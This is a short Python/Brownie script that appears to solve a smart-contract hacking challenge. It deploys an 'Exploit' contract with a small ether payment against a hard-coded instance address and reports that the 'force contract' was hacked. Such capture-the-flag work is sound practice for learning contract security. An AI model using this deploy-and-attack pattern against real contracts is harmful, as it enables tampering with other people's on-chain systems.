from brownie import accounts, config, Exploit
from web3 import Web3
import os

INSTANCE_ADDRESS = "0x53b02A43981e1a137d4363baB5fB58ED223E19FC"
ACCOUNT = accounts.add(config["wallets"]["from_key"])

w3 = Web3(Web3.HTTPProvider(os.getenv("PROJECT_ENDPOINT")))

def hack():

    contract_instance = Exploit.deploy(
        INSTANCE_ADDRESS, 
        {"from": ACCOUNT, "value": w3.toWei((0.000001), "ether")}
    )

    print(f"Contract has been hacked. Now the balance of the force contract is {w3.eth.get_balance(INSTANCE_ADDRESS)}")

def main():
    hack()
